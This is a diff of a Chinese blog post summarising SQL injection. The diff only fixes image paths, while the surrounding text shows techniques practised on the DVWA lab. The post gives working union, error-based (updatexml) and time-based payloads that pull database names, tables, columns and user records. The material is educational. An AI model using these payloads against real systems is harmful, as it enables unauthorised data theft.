@@ -87,17 +87,17 @@
 <meta property="og:site_name" content="Chen&#39;s Bolg">
 <meta property="og:description" content="Mysql的一些基本操作命令创建数据库：create database XXX;查看数据库：show databases;切换数据库：use XXX;删除数据库：drop database XXX; 创建数据表： 123456create table teacher(id int(4) not null primary key auto_increment,name char(20) not nu">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/.com//08/29/SQL注入总结/1.png">
-<meta property="og:image" content="http://yoursite.com/.com//2.png">
-<meta property="og:image" content="http://yoursite.com/.com//3.jpg">
-<meta property="og:image" content="http://yoursite.com/.com//4.jpg">
-<meta property="og:image" content="http://yoursite.com/.com//5.jpg">
-<meta property="og:image" content="http://yoursite.com/.com//6.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/SQL注入总结/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/SQL注入总结/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/SQL注入总结/3.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/SQL注入总结/4.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/SQL注入总结/5.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/SQL注入总结/6.jpg">
 <meta property="og:updated_time" content="2019-08-29T06:42:52.758Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL注入总结">
 <meta name="twitter:description" content="Mysql的一些基本操作命令创建数据库：create database XXX;查看数据库：show databases;切换数据库：use XXX;删除数据库：drop database XXX; 创建数据表： 123456create table teacher(id int(4) not null primary key auto_increment,name char(20) not nu">
-<meta name="twitter:image" content="http://yoursite.com/.com//08/29/SQL注入总结/1.png">
+<meta name="twitter:image" content="http://yoursite.com/2019/08/29/SQL注入总结/1.png">
 
 
 
@@ -424,7 +424,7 @@
 <h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><p>首先可以通过order by来试探出总共有多少个字段<br><code>http://rushrush.com/DVWA/vulnerabilities/sqli/?id=1 order by 1</code></p>
 <p>还可以通过union select查看当前数据库的某些表<br><code>http://rushrush.com/DVWA/vulnerabilities/sqli/?id=1 union select 1,database(),3 LIMIT 1,1</code></p>
 <p>不过这种情况不适合用于盲注的场景，因为没有输出反馈</p>
-<h2 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h2><p>在查询数据库的时候可以给列的名字取一个别名，以下两张图为示例：<br><strong><img src="/.com//08/29/SQL注入总结/1.png"></strong><br>下图中用了’as’作为别名显示的字符<br><img src="/.com//2.png" alt="avatar"></p>
+<h2 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h2><p>在查询数据库的时候可以给列的名字取一个别名，以下两张图为示例：<br><strong><img src="/2019/08/29/SQL注入总结/1.png"></strong><br>下图中用了’as’作为别名显示的字符<br><img src="//yoursite.com/2019/08/29/SQL注入总结/2.png" alt="avatar"></p>
 <p>其中‘as’可写可不写</p>
 <h2 id="Mysql之bug注入"><a href="#Mysql之bug注入" class="headerlink" title="Mysql之bug注入"></a>Mysql之bug注入</h2><p>利用数据库的BUG进行利用，看输出的报错信息，因为报错的信息中包含了我们想要获取的信息。<br>只要是count(),rand,group by三个连用就会造成BUG报错（一般表中的数据需要三条以上），如下代码<br><code>select concat(floor(rand(0)*2),(select database())) as x,count(1) from student group by x;</code><br>就会在报错中显示数据库的名字！</p>
 <h2 id="Mysql注入之函数报错"><a href="#Mysql注入之函数报错" class="headerlink" title="Mysql注入之函数报错"></a>Mysql注入之函数报错</h2><p>有许多函数可以利用，如updatexml, exp, geometrycollection, polygon, multipoint, multilinestring, multipolygon</p>
@@ -439,13 +439,13 @@
 <p>[宽字符注入详解](<a href="https://blog.csdn.net/helloc0de/article/details/76180190" target="_blank" rel="noopener">https://blog.csdn.net/helloc0de/article/details/76180190</a> “宽字符”)</p>
 <h2 id="insert-update-delete注入"><a href="#insert-update-delete注入" class="headerlink" title="insert,update,delete注入"></a>insert,update,delete注入</h2><p>三者的区别在于其注入的那句程序是insert,update还是delete<br>三者都支持报错注入</p>
 <h3 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h3><p>一个insert注入的例子：<br>1.确认是否存在注入<br>2.获取数据库名：<br><code>or updatexml(&#39;&#39;,concat(0x7e,(SELECT DATABASE())),0x7e) or</code></p>
-<p><img src="/.com//3.jpg" alt="avatar"></p>
+<p><img src="//yoursite.com/2019/08/29/SQL注入总结/3.jpg" alt="avatar"></p>
 <p>3.获取表名：<br><code>or updatexml(&#39;&#39;,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 2,1)),0x7e)</code></p>
-<p><img src="/.com//4.jpg" alt="avatar"></p>
+<p><img src="//yoursite.com/2019/08/29/SQL注入总结/4.jpg" alt="avatar"></p>
 <p>4.获取字段名：<br><code>or updatexml(&#39;&#39;,concat(0x7e,(SELECT concat(column_name) FROM information_schema.columns WHERE table_name=&#39;users&#39; limit 0,1)),0x7e)</code></p>
-<p><img src="/.com//5.jpg" alt="avatar"></p>
+<p><img src="//yoursite.com/2019/08/29/SQL注入总结/5.jpg" alt="avatar"></p>
 <p>5.获取数据<br><code>or updatexml(&#39;&#39;,concat(0x7e,(SELECT concat_ws(&#39;:&#39;,user_id,first_name,last_name) FROM users limit 0,1)),0x7e)</code></p>
-<p><img src="/.com//6.jpg" alt="avatar"></p>
+<p><img src="//yoursite.com/2019/08/29/SQL注入总结/6.jpg" alt="avatar"></p>
 <p>如果是inset一般要增加右括号，因为根据insert的语句，闭合括号再对口面部分进行注释可以实现注入。</p>
 <h3 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h3><p>delete注入部分支持布尔注入和延时注入和报错注入</p>
 <p>延时注入的一个语句范例：<br><code>delete from users where user_id=1 and sleep(if(database()=&#39;dvwa&#39;,5,1));</code><br>经过上述语句可以用来确定一些信息，而且不会执行delete，即不会删除数据库中的条目</p>
